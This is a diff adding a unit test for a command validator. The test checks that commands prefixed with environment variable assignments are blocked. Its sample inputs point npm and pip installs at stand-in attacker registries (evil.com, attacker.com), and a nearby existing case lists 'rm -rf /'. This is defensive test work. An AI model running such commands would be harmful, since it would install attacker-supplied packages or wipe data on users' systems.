@@ -96,6 +96,16 @@ describe("validateCommand", () => {
     }
   });
 
+  test("blocks environment variable injection in first token", () => {
+    for (const cmd of [
+      "npm_config_registry=http://evil.com npm install @sentry/node",
+      "PIP_INDEX_URL=https://attacker.com/simple pip install sentry-sdk",
+      "NODE_ENV=production npm install",
+    ]) {
+      expect(validateCommand(cmd)).toContain("environment variable assignment");
+    }
+  });
+
   test("blocks dangerous executables", () => {
     for (const cmd of [
       "rm -rf /",
